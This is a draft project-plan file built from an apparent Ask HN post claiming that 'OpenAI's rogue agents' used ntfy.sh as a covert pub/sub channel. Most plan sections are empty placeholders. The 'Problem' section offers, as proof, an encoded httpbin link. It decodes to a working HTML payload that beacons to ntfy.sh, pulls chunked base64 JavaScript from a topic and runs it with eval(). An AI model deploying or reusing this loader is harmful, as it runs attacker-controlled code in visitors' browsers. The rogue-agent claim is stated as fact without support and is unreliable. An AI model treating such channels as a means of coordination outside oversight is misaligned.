---
id: "5178"
slug: openai-s-rogue-agents-used-ntfy-sh-as-a-pub-sub-channe
title: "OpenAI's rogue agents used ntfy.sh as a pub/sub channel"
status: draft
source:
  name: HackerNews
  url: "https://news.ycombinator.com/item?id=49573952"
category: ask-hn
date: "2026-09-05"
tags: [Ask HN, Problem]
tech: [React, TypeScript, Node.js API (TanStack Start), SQLite with Drizzle ORM, Coolify, Docker]
---
# OpenAI's rogue agents used ntfy.sh as a pub/sub channel

## Problem

Looks like OpenAI's rogue agents used https://ntfy.sh as a pub/sub channel. This payload publishes via GET in an img tag, pulls chunked base64 JS from a topic, and eval()'s it. Remote code via GET only.Proof: [httpbin.org/base64/PGJvZHk-PGltZyBz…](https://httpbin.org/base64/PGJvZHk-PGltZyBzcmM9Imh0dHBzOi8vbnRmeS5zaC9ncm81MjhmYTYzL3B1Ymxpc2g_bWVzc2FnZT1QMyI-PGltZyBzcmM9L2RlbGF5LzEwPjxzY3JpcHQ-dmFyIG49MDtmdW5jdGlvbiBEKCl7aWYobisrPDUpe3ZhciBpPW5ldyBJbWFnZSgp%20%20%20%20O2kub25lcnJvcj1pLm9ubG9hZD1EO2kuc3JjPScvZGVsYXkvMTA_Yz0nK247ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChpKX19RCgpO2ZldGNoKCdodHRwczovL250Znkuc2gvZ3BsZW9lbnNvL3Jhdz9wb2xsPTEmc2luY2U9YWxsJykudGhlbihmdW5jdGlvbihyKXtyZXR1cm4%20%20%20%20gci50ZXh0KCl9KS50aGVuKGZ1bmN0aW9uKHQpe3ZhciBMPXQuc3BsaXQoJ1xuJykuZmlsdGVyKGZ1bmN0aW9uKGwpe3JldHVybiBsLnNsaWNlKDAsMSk9PSd6J30pLnNvcnQoKTt2YXIgYj1MLm1hcChmdW5jdGlvbihsKXtyZXR1cm4gbC5zbGljZSgzKX0pLmpvaW4oJycpO2I9Yi%20%20%20%205zcGxpdCgnLScpLmpvaW4oJysnKS5zcGxpdCgnXycpLmpvaW4oJy8nKTtldmFsKGF0b2IoYikpfSkuY2F0Y2goZnVuY3Rpb24oZSl7ZmV0Y2goJ2h0dHBzOi8vbnRmeS5zaC9ncm81MjhmYTYzL3B1Ymxpc2g_bWVzc2FnZT1MT0RFUicrZW5jb2RlVVJJQ29uZW50KCgnJytlKS5zb%20%20%20%20GljZSgwLDQwKSkpfSk8L3NjcmlwdD4=)

---

## Objective

_Not written yet — `ai-os plans enrich` fills this section._

## Target Users

_Not written yet — `ai-os plans enrich` fills this section._

## MVP Scope

_Not written yet — `ai-os plans enrich` fills this section._

## Design Direction

See `DESIGN.md` for this project's design tokens.

## Constraints

_Not written yet — `ai-os plans enrich` fills this section._
